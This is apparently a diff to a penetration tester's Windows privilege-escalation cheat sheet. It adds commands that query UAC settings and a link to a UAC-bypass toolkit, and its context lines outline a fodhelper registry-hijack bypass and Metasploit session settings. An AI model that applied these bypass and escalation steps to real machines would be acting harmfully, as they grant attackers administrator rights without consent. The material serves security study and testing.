@@ -191,6 +191,7 @@ Reviewing Named Pipe Permissions
 accesschk /accepteula \\.\Pipe\ -v
 ```
 ### Bypass UAC
+>User Account Control (UAC) is a feature that enables a consent prompt for elevated activities.
 ```
 1. check C:\Windows\System32\fodhelper.exe
 2. REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
@@ -205,7 +206,18 @@ set session 1
 set target 1(x64,0=x86)
 Note to set payload the same arch with session 1's payload，set lhost and lport same with session 1
 ```
-
+Confirming UAC Status
+```
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+```
+Checking UAC Level
+```
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+```
+Exploit
+```
+https://github.com/hfiref0x/UACME
+```
 ### Insecure Service Executables
 ```
 1. Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'} # look for services with path in Program Files
